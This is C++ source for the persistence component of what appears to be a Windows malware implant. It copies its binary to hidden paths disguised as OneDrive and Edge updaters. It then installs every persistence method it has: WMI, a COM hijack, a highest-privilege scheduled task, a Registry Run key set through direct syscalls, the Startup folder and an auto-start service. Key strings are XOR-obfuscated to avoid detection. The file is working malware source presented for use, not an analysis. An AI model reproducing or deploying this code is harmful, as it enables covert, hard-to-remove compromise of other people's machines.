#include "Persistence.h"
#include "WmiPersistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>

namespace persistence {

namespace {
    const wchar_t kRunKeyEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'M'^0x5A, 'i'^0x5A, 'c'^0x5A, 'r'^0x5A, 'o'^0x5A, 's'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, '\\'^0x5A, 'W'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'o'^0x5A, 'w'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'u'^0x5A, 'r'^0x5A, 'r'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'V'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '\\'^0x5A, 'R'^0x5A, 'u'^0x5A, 'n'^0x5A }; // Software\Microsoft\Windows\CurrentVersion\Run
    const wchar_t kTaskNameEnc[] = { 'O'^0x5A, 'n'^0x5A, 'e'^0x5A, 'D'^0x5A, 'r'^0x5A, 'i'^0x5A, 'v'^0x5A, 'e'^0x5A, 'S'^0x5A, 'y'^0x5A, 'n'^0x5A, 'c'^0x5A }; // OneDriveSync
    const wchar_t kClsidEnc[] = { '{'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '2'^0x5A, '1'^0x5A, '4'^0x5A, '0'^0x5A, '1'^0x5A, '-'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '-'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '-'^0x5A, 'C'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '-'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '0'^0x5A, '4'^0x5A, '6'^0x5A, '}'^0x5A }; // {00021401-0000-0000-C000-000000000046}

    std::wstring GetPersistencePath(bool admin) {
        wchar_t path[MAX_PATH];
        if (admin) {
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) {
                return std::wstring(path) + L"\\Microsoft\\OneDriveSync.exe";
            }
        } else {
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
                return std::wstring(path) + L"\\Microsoft\\EdgeUpdate.exe";
            }
        }
        return L"";
    }

    bool InstallRegistryRun(const std::wstring& implantPath) {
        std::wstring sid = utils::GetCurrentUserSid();
        if (sid.empty()) return false;
        auto& resolver = evasion::SyscallResolver::GetInstance();
        DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
        DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
        DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
        std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
        UNICODE_STRING uHkcu;
        uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
        uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
        uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hHkcu = NULL;
        NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hHkcu, (UINT_PTR)KEY_WRITE, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
        if (!NT_SUCCESS(status)) return false;
        HANDLE hRunKey = NULL;
        status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, utils::DecryptW(kRunKeyEnc, 45), &hRunKey);
        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        if (NT_SUCCESS(status)) {
            std::wstring valName = utils::DecryptW(kTaskNameEnc, 12);
            UNICODE_STRING uValName;
            uValName.Buffer = (PWSTR)valName.c_str();
            uValName.Length = (USHORT)(valName.length() * sizeof(wchar_t));
            uValName.MaximumLength = uValName.Length + sizeof(wchar_t);
            InternalDoSyscall(ntSetValueKeySsn, (UINT_PTR)hRunKey, (UINT_PTR)&uValName, 0, (UINT_PTR)REG_SZ, (UINT_PTR)implantPath.c_str(), (UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
            InternalDoSyscall(ntCloseSsn, (UINT_PTR)hRunKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
            return true;
        }
        return false;
    }

    bool InstallStartupFolder(const std::wstring& implantPath) {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path))) {
            std::wstring dest = std::wstring(path) + L"\\OneDriveSync.exe";
            if (CopyFileW(implantPath.c_str(), dest.c_str(), FALSE)) {
                SetFileAttributesW(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                return true;
            }
        }
        return false;
    }

    bool InstallService(const std::wstring& implantPath) {
        if (!utils::IsAdmin()) return false;
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!hSCM) return false;
        std::wstring svcName = utils::DecryptW(kTaskNameEnc, 12);
        SC_HANDLE hService = CreateServiceW(hSCM, svcName.c_str(), svcName.c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
        if (hService) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
        CloseServiceHandle(hSCM);
        return false;
    }

    bool InstallScheduledTask(const std::wstring& implantPath) {
        std::wstring taskName = utils::DecryptW(kTaskNameEnc, 12);
        std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc onlogon /f /rl highest";
        return WinExec(utils::ws2s(cmd).c_str(), SW_HIDE) > 31;
    }
}

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    LOG_INFO("Establishing persistence...");
    bool isAdmin = utils::IsAdmin();
    std::wstring targetPath = GetPersistencePath(isAdmin);
    if (targetPath.empty()) return L"";

    wchar_t currentPath[MAX_PATH];
    if (overrideSourcePath.empty()) {
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    } else {
        wcscpy(currentPath, overrideSourcePath.c_str());
    }

    if (wcscmp(currentPath, targetPath.c_str()) != 0) {
        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));
        CreateDirectoryW(dir.c_str(), NULL);
        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
        } else {
            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    std::wstring taskName = utils::DecryptW(kTaskNameEnc, 12);

    // Redundancy is mandatory: Install ALL methods

    if (WmiPersistence::Install(targetPath, taskName)) {
        LOG_INFO("WMI Persistence success");
        WmiPersistence::Verify(taskName);
    }

    std::wstring clsid = utils::DecryptW(kClsidEnc, 38);
    if (ComHijacker::Install(targetPath, clsid)) {
        LOG_INFO("COM Hijack success");
        ComHijacker::Verify(clsid);
    }

    if (InstallScheduledTask(targetPath)) {
        LOG_INFO("Scheduled Task success");
    }

    if (InstallRegistryRun(targetPath)) {
        LOG_INFO("Registry Run success");
    }

    if (InstallStartupFolder(targetPath)) {
        LOG_INFO("Startup Folder success");
    }

    if (InstallService(targetPath)) {
        LOG_INFO("Service success");
    }

    return targetPath;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
